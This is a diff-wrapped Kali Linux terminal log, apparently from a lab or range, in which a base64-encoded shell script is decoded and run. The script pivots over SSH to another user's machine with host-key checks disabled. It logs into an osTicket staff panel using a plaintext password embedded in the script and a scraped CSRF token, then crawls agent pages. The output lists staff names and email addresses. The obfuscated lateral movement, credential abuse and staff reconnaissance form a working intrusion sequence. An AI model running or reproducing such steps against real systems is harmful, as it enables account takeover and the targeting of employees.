@@ -1,0 +1,17 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/r9.sh <<'B64EOF'
+> c2V0ICtlClM9InNzaCAtbyBCYXRjaE1vZGU9eWVzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyByb3dhbi1kZXYiCiRTICdiYXNoIC1zJyA8PCdJTk5FUicKQ0E9L2hvbWUvcm93YW4vLmxvY2FsL3NoYXJlL2tlcGxlcm9wcy9jYS5jcnQKQj1odHRwczovL3N1cHBvcnQua2VwbGVyb3BzLnRlc3QKSj0vdG1wL2NrNi50eHQ7IHJtIC1mICRKCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYyAkSiAiJEIvc2NwL2xvZ2luLnBocCIgLW8gL3RtcC9sLmh0bWwKVD0kKGdyZXAgLW9FICduYW1lPSJfX0NTUkZUb2tlbl9fIiB2YWx1ZT0iW14iXSsiJyAvdG1wL2wuaHRtbCB8IHNlZCAtRSAncy8uKnZhbHVlPSIoW14iXSspIi4qL1wxLycpCmN1cmwgLXNTIC1tIDEwIC0tY2FjZXJ0ICRDQSAtYiAkSiAtYyAkSiAtWCBQT1NUICIkQi9zY3AvbG9naW4ucGhwIiBcCiAtLWRhdGEtdXJsZW5jb2RlICJfX0NTUkZUb2tlbl9fPSRUIiAtLWRhdGEtdXJsZW5jb2RlICJ1c2VyaWQ9bWF5YS5yYW5zY29tYmUiIFwKIC0tZGF0YS11cmxlbmNvZGUgInBhc3N3ZD1zV1FhMzEwODVGVFFla1poSFR4VXlmXzlFMW1hcnEwdXI4V05DS21UdG5rIiBcCiAtLWRhdGEtdXJsZW5jb2RlICJkc3Q9L3NjcC90aWNrZXRzLnBocCIgLS1kYXRhLXVybGVuY29kZSAic3VibWl0PVNpZ24gSW4iIC1vIC9kZXYvbnVsbApmb3IgdSBpbiAiYWdlbnRzLnBocCIgImFnZW50cy5waHA/dHlwZT1hIiAiZGlyZWN0b3J5LnBocCIgImFnZW50cy5waHA/ZG89c2VhcmNoJnE9dGFsaWEiOyBkbwplY2hvICIjIyMjIyAkdSIKY3VybCAtc1MgLW0gMTAgLS1jYWNlcnQgJENBIC1iICRKIC1jICRKICIkQi9zY3AvJHUiIC1vIC90bXAvYS5odG1sCnB5dGhvbjMgLSA8PCdQWScKaW1wb3J0IHJlLGh0bWwKZD1vcGVuKCcvdG1wL2EuaHRtbCcsZXJyb3JzPSdpZ25vcmUnKS5yZWFkKCkKZD1yZS5zdWIocic8c2NyaXB0Lio/PC9zY3JpcHQ+JywnJyxkLGZsYWdzPXJlLlMpOyBkPXJlLnN1YihyJzxzdHlsZS4qPzwvc3R5bGU+JywnJyxkLGZsYWdzPXJlLlMpCmxpbmtzPXJlLmZpbmRhbGwocidocmVmPSIoW14iXSspIltePl0qPihbXjxdezEsODB9KScsZCkKZm9yIGgsdCBpbiBsaW5rczoKICAgIGlmICdhZ2VudCcgaW4gaCBvciAndGFsaWEnIGluIHQubG93ZXIoKSBvciAnbW9ybmFjJyBpbiB0Lmxvd2VyKCk6CiAgICAgICAgcHJpbnQoaCwnfCcsaHRtbC51bmVzY2FwZSh0LnN0cmlwKCkpKQp0PXJlLnN1YihyJzxbXj5dKz4nLCcgJyxkKTsgdD1odG1sLnVuZXNjYXBlKHQpOyB0PXJlLnN1YihyJ1xzKycsJyAnLHQpCnByaW50KCdURVhUOicsdFs6MTIwMF0pClBZCmRvbmUKSU5ORVIK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/r9.sh; bash /tmp/r9.sh; echo DONEMARK_1795194790502$((6*7))
+##### agents.php
+TEXT:  404 Not Found Not Found The requested URL was not found on this server. Apache/2.4.68 (Debian) Server at support.keplerops.test Port 80 
+##### agents.php?type=a
+TEXT:  404 Not Found Not Found The requested URL was not found on this server. Apache/2.4.68 (Debian) Server at support.keplerops.test Port 80 
+##### directory.php
+TEXT:  osTicket :: Staff Control Panel Welcome, Maya . | Agent Panel | Profile | Log Out Dashboard Tasks Tasks Tickets Knowledgebase FAQs Canned Responses Dashboard Agent Directory My Profile — All Departments — Customer Escalations Support Agents Name Department Email Address Phone Number Extension Mobile Number Maya Ranscombe Support maya.ranscombe@keplerops.test Rowan Ito Support rowan.ito@keplerops.test Support Administrator Support support-admin@keplerops.test Talia Mornac Support talia.mornac@keplerops.test Page: [1] Copyright © 2006-2026 FieldKest Support All Rights Reserved. or your auto cron will cease to function --> or your auto cron will cease to function --> Loading ... Loading ... 
+##### agents.php?do=search&q=talia
+TEXT:  404 Not Found Not Found The requested URL was not found on this server. Apache/2.4.68 (Debian) Server at support.keplerops.test Port 80 
